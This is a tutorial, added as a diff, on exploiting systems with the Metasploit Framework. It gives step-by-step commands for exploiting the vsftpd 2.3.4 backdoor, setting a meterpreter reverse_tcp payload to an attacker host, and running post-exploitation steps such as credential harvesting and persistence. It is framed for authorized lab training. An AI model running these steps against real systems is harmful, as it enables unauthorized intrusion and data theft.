@@ -1,0 +1,240 @@
+1. Introduction
+
+Hacking with Metasploit refers to using the Metasploit Framework to simulate real-world attacks in a controlled and authorized environment. This module focuses on how Metasploit is used during ethical hacking and penetration testing to exploit vulnerabilities, gain access, and assess security risks.
+
+⚠️ This knowledge is strictly for educational and defensive purposes.
+
+2. Role of Metasploit in Ethical Hacking
+
+Metasploit is used to:
+
+Validate discovered vulnerabilities
+
+Simulate attacker behavior
+
+Measure real-world impact
+
+Improve defensive security controls
+
+It turns theoretical vulnerabilities into practical proof.
+
+3. Ethical Hacking Workflow with Metasploit
+
+Reconnaissance
+
+Scanning & Enumeration
+
+Vulnerability Identification
+
+Exploitation (Metasploit)
+
+Post-Exploitation
+
+Reporting
+
+4. Target Enumeration Before Exploitation
+
+Before hacking with Metasploit, attackers gather information using tools like:
+
+Nmap (open ports & services)
+
+Nikto (web vulnerabilities)
+
+Gobuster (directories)
+
+Nessus/OpenVAS (vulnerability scanning)
+
+Example:
+
+nmap -sV target_ip
+
+5. Searching Vulnerabilities in Metasploit
+
+Once a vulnerable service is identified:
+
+msfconsole
+search service_name
+search cve:YYYY-NNNN
+
+
+Example:
+
+search vsftpd
+
+6. Selecting an Exploit
+use exploit/unix/ftp/vsftpd_234_backdoor
+info
+
+
+The info command helps understand:
+
+Target OS
+
+Required options
+
+Payload compatibility
+
+7. Configuring the Exploit
+show options
+set RHOSTS target_ip
+set RPORT 21
+
+
+Optional:
+
+set LHOST attacker_ip
+set LPORT 4444
+
+8. Choosing a Payload
+
+Common payloads used in hacking:
+
+Reverse shell
+
+Bind shell
+
+Meterpreter
+
+Example:
+
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+
+9. Launching the Exploit
+exploit
+
+
+or
+
+run
+
+
+If successful, a session is opened.
+
+10. Gaining Shell Access
+
+Once exploited, the attacker may get:
+
+Command shell
+
+Meterpreter shell
+
+Example:
+
+shell
+
+11. Meterpreter-Based Hacking
+
+Meterpreter allows advanced post-exploitation actions:
+
+sysinfo
+getuid
+ps
+
+
+Capabilities:
+
+File access
+
+Process migration
+
+Privilege escalation
+
+Network pivoting
+
+12. Session Management
+
+List active sessions:
+
+sessions
+
+
+Interact with a session:
+
+sessions -i 1
+
+13. Post-Exploitation Activities
+
+After access is gained:
+
+System enumeration
+
+Credential harvesting
+
+Privilege escalation checks
+
+Persistence testing
+
+(Only in authorized labs)
+
+14. Common Attacks Performed with Metasploit
+
+Exploiting outdated services
+
+Weak authentication testing
+
+Misconfigured services
+
+Known CVE exploitation
+
+15. Real-World Lab Example
+
+Scenario:
+
+Target: Metasploitable VM
+
+Vulnerability: vsftpd 2.3.4
+
+Tool: Metasploit
+
+Outcome:
+
+Successful exploit
+
+Shell access
+
+Vulnerability validated
+
+Report generated
+
+16. Risks of Using Metasploit Improperly
+
+System crashes
+
+Data loss
+
+Detection by IDS/IPS
+
+Legal consequences
+
+17. Ethical and Legal Considerations
+
+Hacking with Metasploit must be done:
+
+With written permission
+
+In lab environments
+
+During professional assessments
+
+Illegal hacking is punishable by law.
+
+18. Safe Practice Environments
+
+Recommended platforms:
+
+Metasploitable
+
+TryHackMe
+
+Hack The Box
+
+VulnHub
+
+19. Difference Between Learning and Real Attacks
+Learning (Ethical)	Real Attack (Illegal)
+Authorized	Unauthorized
+Educational	Criminal
+Defensive goal	Malicious goal
+20. Conclusion
+
+Hacking with Metasploit is a core skill in penetration testing. When used responsibly, it helps security professionals understand attacker techniques, validate vulnerabilities, and strengthen defenses.
